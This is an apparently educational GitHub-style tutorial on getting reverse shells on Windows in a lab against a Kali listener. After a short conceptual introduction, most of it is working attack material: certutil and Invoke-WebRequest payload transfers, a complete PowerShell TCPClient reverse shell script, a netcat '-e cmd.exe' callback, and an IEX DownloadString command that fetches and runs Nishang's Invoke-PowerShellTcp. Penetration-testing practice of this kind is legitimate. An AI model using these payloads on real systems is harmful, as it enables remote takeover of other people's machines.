<h1 align="center"> Windows Reverse Shells </h1>










# Introduction to Window's Reverse Shells

## What is Shells?
A shell is a program that provides an interface between the user and operating system.


## Why Reverse Shells?
- Firewall Evasion: Most firewalls block incoming connections but allow outgoing
- NAT Bypass: Works behind NAT without port forwarding
- Stealthier: Less likely to trigger inbound connection alerts


## Type of Shells

### What is Reverse Shells? 
A **reverse shell** is when a target computer connects outward to another system and gives remote command access. The attacker machine now acts as server, while a public IP on which it listens for incoming connections. The compromised system instead acts as a client.
- The target initiates the connection
- Works well when firewalls block incoming connections
- More common in real attacks

````
Compromised system -----> Attacker Machine
````

> The victims calls the attacker




### What is bind Shells?
A **Bind Shell**: Is when target computers open a port and listening for comming. The attacker force the vulnerable compromised to open a port and listen for incoming connections.
- The target waits for a connection.
- Requires in bound access.
- Often blocked by firewalls.

````
Attacker Machine -----> Compromised System
````
> The victim open a door and waits.

> The compromised system acts as a server, while the attacker machine ascts a client. 

## How Reverse Shells & Bind Shells Work:

### How Reverse Shells work:
- The attacker sets up a program that listens for incoming connections (like a phone waiting to ring).
- The victim runs a small program (payload) that “calls back” to the attacker’s listener.
- Once connected, the attacker can type commands into their listener, and those commands are executed on the victim machine.

### How Bind Shells work:
- The victim runs a program that listens on a specific port (like leaving their phone line open).
- The attacker connects to that port from their machine.
- Once connected, the attacker gets a command interface directly on the victim.


### Connection Flow:
````
Attacker (Kali): nc -lvnp 4444    [LISTENING]
Target (Windows): connects back → Attacker gets shell
````


## Basic Concepts & Terminology
### Key Terms:
- **Listener**: Attacker's machne waiting for connection
- **Payload**: Code executed on machine to craete reverses Shell
- **Staged & Stageless**: Multi-stage & Single payload.
- **Bind Shell & Reverse Shell**: Target listens & Attacker listens.


### Commong port:
| Port     | Common Use / Meaning                                     |
| -------- | -------------------------------------------------------- |
| **4444** | Default port commonly used by Metasploit/Meterpreter.    |
| **443**  | HTTPS traffic; often allowed outbound through firewalls. |
| **53**   | DNS traffic; often allowed outbound in networks.         |
| **80**   | HTTP traffic; often allowed outbound through firewalls.  |



### Requirements:
- **Attacker**: Listener on public / accessible IP
- **Target**: Outbound connectivity to attacker
- **Executables**: Method to run payload on target.


## CONCEPT
````
YOU (Attacker - Kali Linux)                      TARGET (Windows)
┌─────────────────────┐                         ┌─────────────────────┐
│  Listening on port  │                         │                     │
│      4444           │                         │                     │
│  IP: 192.168.1.100  │◀────────────────────────│ Executes payload    │
│                     │   CONNECTION BACK       │ that connects to you│
└─────────────────────┘                         └─────────────────────┘
````





---




# Windows Reverse Shells Methodology 


In this first when I got target `meterpreter` -> afetr I need to get target `shell`:
````
shell
````
<img width="420" height="193" alt="image" src="https://github.com/user-attachments/assets/e07af217-9ec3-4778-8c96-ff82324ed11a" />

- OR we can get `PowerShell`:
````
load powershell
powershell_shell
````
<img width="481" height="121" alt="image" src="https://github.com/user-attachments/assets/73580fef-89e3-49e6-a1b9-774736c7f02f" />

- Now we got target `Powershell` and can use like windows.


- Also in this I need to check my kali `IP`:
````
ifconfig
````
- Or we can use:
````
ip a
````
<img width="982" height="482" alt="image" src="https://github.com/user-attachments/assets/422d045c-5f9a-4bad-8aac-ab699bcad5f1" />

- So this my kali have IP `192.168.127.128`.

---


## 1. File transfer 

### 1. With Certutil
- In this I want to download `winPEAS` and transfer to windows:
- Go to this source: https://github.com/carlospolop/PEASS-ng
<img width="1918" height="1022" alt="image" src="https://github.com/user-attachments/assets/4f9c0a42-25e4-448a-b882-4648f0def4ca" />

- In this first I want to create one folder:
````
mkdir ~/winpeas && cd ~/winpeas
````
<img width="359" height="126" alt="image" src="https://github.com/user-attachments/assets/01d6f71b-2297-4495-819c-f6206a0e6806" />


- Download direct the lates windPEAS executable
````
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
````
<img width="1915" height="654" alt="image" src="https://github.com/user-attachments/assets/43b73f3a-8577-4ab4-a9c2-b058266edc85" />

- Now we was download the winpeas file.


- Verify
````
ls -l winPEASany.exe
````
<img width="624" height="76" alt="image" src="https://github.com/user-attachments/assets/24545f3c-2c25-4cd2-8af3-b277a1ef5cbb" />

- Now we see our file.


##### After I host a ssimple HTTP Server on kali:
- Start an HTTP server in the same directory:
````
python3 -m http.server 8080
````
<img width="594" height="118" alt="image" src="https://github.com/user-attachments/assets/205054fd-d151-4ede-b5c3-8160293a61ac" />


- After back to our windows.


##### On Windows:
````
certutil -urlcache -f http://192.168.127.128:8080/winPEASany.exe winpeas.exe
````
<img width="917" height="109" alt="image" src="https://github.com/user-attachments/assets/b8b9b60d-dd00-4a13-8fb2-a4bbeffd8d6d" />

- Now we successfully to download.


##### Run Winpeas
````
winpeas.exe
````
<img width="1919" height="800" alt="image" src="https://github.com/user-attachments/assets/ad1720d0-4b94-4200-bc72-3b5db668f2dd" />

<img width="1338" height="577" alt="image" src="https://github.com/user-attachments/assets/46ef8e23-9dc8-4b78-b97e-d5ea0cb7eaa8" />

<img width="1708" height="715" alt="image" src="https://github.com/user-attachments/assets/def91dd7-ff25-4f4a-b800-7af80ad0ffe3" />

<img width="1557" height="719" alt="image" src="https://github.com/user-attachments/assets/ff34c395-232b-476d-a438-b55051e02c80" />

<img width="1708" height="761" alt="image" src="https://github.com/user-attachments/assets/b3160842-ab0d-4bcf-aff5-864fe8e0636f" />

<img width="1390" height="739" alt="image" src="https://github.com/user-attachments/assets/eeda5c18-2bf8-49e8-9f45-ea78a081e388" />

<img width="1728" height="703" alt="image" src="https://github.com/user-attachments/assets/2284427e-948f-46b6-83b3-5d6bd1dcb401" />

<img width="997" height="691" alt="image" src="https://github.com/user-attachments/assets/761135f3-99e6-4917-a1e1-af064c1a043a" />

<img width="1742" height="788" alt="image" src="https://github.com/user-attachments/assets/1c9a1933-b08e-49e0-9943-b0f64a39bd6c" />

<img width="775" height="260" alt="image" src="https://github.com/user-attachments/assets/0bbb3658-ff08-4df4-af0b-f6c1b0e44c57" />

- Now we can view all target infomation.




### 2. Invoke-WebRequest or iwr

- In this we need target powershell:
````
load powershell
powershell_shell
````
<img width="353" height="122" alt="image" src="https://github.com/user-attachments/assets/9c58b2fe-69f1-4b72-8fc9-71da4cca2b1b" />


#### On Kali:
- First in this we need to open `Python HTTP Server`:
````
python3 -m http.server 8080
````
<img width="530" height="121" alt="image" src="https://github.com/user-attachments/assets/480eb849-40d3-422e-b183-12e6a35124f1" />


#### On windows
````
Invoke-WebRequest -Uri "http://192.168.127.128:8080/win_priv.exe" -OutFile "C:\Users\k4n0ng\win_priv.exe"
````
<img width="961" height="71" alt="image" src="https://github.com/user-attachments/assets/0b44a4dd-130d-40c9-b4a2-b781c808b078" />

````
ls
````
<img width="917" height="556" alt="image" src="https://github.com/user-attachments/assets/9b00fb79-1f65-455b-8d1d-dfb7f91f634d" />

- Now we see our file that we was copy.

---




## 2. Use Netcat 


### Start Netcat Listener
````
nc -lvnp 1111
````
<img width="388" height="145" alt="image" src="https://github.com/user-attachments/assets/f06d2db4-ceb0-4373-832e-af057b23db0d" />


- `nc`: netcat program
- `-l`: listen (wait for connection)
- `-v`: verbose (show messages)
- `-n`: don't resolve names (faster)
- `-p 1111`: use port 1111


- In this I create one file:
````
sudo mousepad reverse_shells.ps1
````
````
$client = New-Object System.Net.Sockets.TCPClient("192.168.127.128",1111)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}

while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
````
<img width="1302" height="452" alt="image" src="https://github.com/user-attachments/assets/0c94c995-e47f-47b3-bec5-3d26c54732da" />


- After I transfer:
````
python3 -m http.server 8000
````
<img width="744" height="125" alt="image" src="https://github.com/user-attachments/assets/6d1e7b1a-8d1c-44e6-979a-4b75c27780af" />

<img width="1918" height="853" alt="image" src="https://github.com/user-attachments/assets/e8c1a99d-8cfa-40c7-8985-10c17170e157" />

<img width="787" height="640" alt="image" src="https://github.com/user-attachments/assets/200a92f0-41fb-4347-9fe7-8ca78769136c" />

<img width="467" height="342" alt="image" src="https://github.com/user-attachments/assets/f4c2c7ef-836d-4ca1-8f0a-486109824526" />

<img width="1218" height="836" alt="image" src="https://github.com/user-attachments/assets/faf4404a-e328-407d-a62e-ea640f44a777" />


- After back to our Attacker:
<img width="668" height="163" alt="image" src="https://github.com/user-attachments/assets/89a61c08-1e62-4d63-b168-8c2f79a62d4d" />

- In this we just press `Enter`, after we will got target shell:

<img width="802" height="818" alt="image" src="https://github.com/user-attachments/assets/a82d10b5-a522-4701-a597-d5ae013e11f9" />

- Now we got target shell.



---


### CMD.exe Netcat More Reliable

#### Get Netcat on the Windows Machine
First I need to check directory of netcat:
````
cd /usr/share/windows-resources/binaries
ls
````
<img width="1157" height="185" alt="image" src="https://github.com/user-attachments/assets/eb3de6a4-83e5-4c32-8e43-8b6436343555" />


- And i have one folder that i want to copy:
<img width="370" height="161" alt="image" src="https://github.com/user-attachments/assets/877bba40-c7bb-4c16-887a-e33cb9b69251" />

- This my folder that I want to copy.
````
cp /usr/share/windows-resources/binaries/nc.exe /home/k4n0ng/Desktop/Automation/
````
<img width="714" height="93" alt="image" src="https://github.com/user-attachments/assets/b52da699-ebb9-48ac-869f-e48ab12d48c2" />

- After in my `Automation` folder:
````
ls 
````
<img width="371" height="163" alt="image" src="https://github.com/user-attachments/assets/a1d2d2de-43fa-4d5e-9fd3-27ea993739ad" />

- Now I see my file that I was copy.


##### Host python HTTP server:
````
python3 -m http.server 8080
````
<img width="620" height="156" alt="image" src="https://github.com/user-attachments/assets/61f23b70-1124-40e0-8a16-2d4f244b48b4" />


##### Transfer our file to windows
````
certutil -urlcache -split -f http://192.168.127.128/nc.exe C:\Users\k4n0ng\Helo\nc.exe
````
<img width="904" height="132" alt="image" src="https://github.com/user-attachments/assets/ea93a7b4-3e7d-4275-bdf7-888c7f685a28" />

- Now I got successfully to copy it.

##### Verify
````
dir C:\Users\k4n0ng\Helo\nc.exe
````
<img width="519" height="176" alt="image" src="https://github.com/user-attachments/assets/89aca7d8-bfdc-457c-b94a-1818c2f19064" />



##### On kali:
- Start listen:
````
nc -lvnp 4444
````
<img width="793" height="189" alt="image" src="https://github.com/user-attachments/assets/14f7173a-dfcb-4983-bf08-a6d1619ba30f" />

- If we have problem like this, to fix it:
````
sudo lsof -i :4444
````
<img width="1281" height="173" alt="image" src="https://github.com/user-attachments/assets/7a34581a-95f2-4943-bd4e-6eb80e15453a" />

````
sudo kill -9 553374
````
<img width="353" height="78" alt="image" src="https://github.com/user-attachments/assets/34059e9c-0b8d-425c-9fb6-0239600f459b" />

- After open listener agai:
````
nc -lvnp 4444
````
<img width="371" height="136" alt="image" src="https://github.com/user-attachments/assets/415d84de-9719-4b28-8a61-f465e187bfef" />


##### Launch reverse shell from windows:
- But in this I disconnect on my shell on kali:
<img width="507" height="233" alt="image" src="https://github.com/user-attachments/assets/8caa6942-22dd-4432-b929-ddff62fd88ee" />


- So I execute this shell on direct windows:
````
cd Helo
nc.exe 192.168.127.128 4444 -e cmd.exe
````
<img width="571" height="123" alt="image" src="https://github.com/user-attachments/assets/ef4f1973-7b80-49f3-80dc-61a29301fd9c" />

- After back to our attack terminal:
<img width="960" height="770" alt="image" src="https://github.com/user-attachments/assets/993ccb9f-0584-4d40-a10e-25443f6fcc04" />

- Now we got successful to get target shell.


---



## 3. Invoke-PowerShellTcp.ps1

### Download the script on Kali:
````
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
````
<img width="1878" height="487" alt="image" src="https://github.com/user-attachments/assets/76e7725e-4c6e-4b73-aee4-1e257d19d2e8" />


### Edit the Script to Include Your Attack Details
````
nano Invoke-PowerShellTcp.ps1
````
- Go to the very end and add one line:
````
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.127.128 -Port 4444
````
<img width="1912" height="887" alt="image" src="https://github.com/user-attachments/assets/a9823ddf-16fb-4cc9-9ed7-650546406589" />

- `192.168.127.128`: IS my IP.
- To save it: press `Ctrl + O` -> `Enter` -> `Ctrl + X`.


#### Host It via HTTP
````
python3 -m http.server 8000
````
<img width="527" height="124" alt="image" src="https://github.com/user-attachments/assets/e697ff39-421c-449c-9717-ea119557e496" />



#### Start Netcat Listener on Kali
````
nc -lvnp 4444
````
<img width="325" height="130" alt="image" src="https://github.com/user-attachments/assets/198f9c93-2ac7-4c01-9988-40e412749ae5" />



#### Execute on Windows (in PowerShell or CMD)
- On PowerShell:
````
IEX(New-Object Net.WebClient).DownloadString('http://192.168.127.128:8000/Invoke-PowerShellTcp.ps1')
````
- Or from CMD
````
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.127.128:8000/Invoke-PowerShellTcp.ps1')"
````
<img width="1084" height="218" alt="image" src="https://github.com/user-attachments/assets/0ee5158c-c804-40ea-9078-587b90f4a8cd" />

- After back to our attacker.

- Now we see the target `Shell`:
<img width="958" height="792" alt="image" src="https://github.com/user-attachments/assets/b9ba9497-adda-4d64-b523-85aeafa48f3c" />

<img width="1133" height="618" alt="image" src="https://github.com/user-attachments/assets/75b0f9c1-8c9b-40c7-819a-9eb88e38c46f" />



----

<h2 align="center"> Finished of Windows Reverse Shells </h2>


<h2 align="center"> Credit By: Nin Kanong (k4n0ng) </h2>



<h3 align="center"> Date: 31/12/2025 </h3>

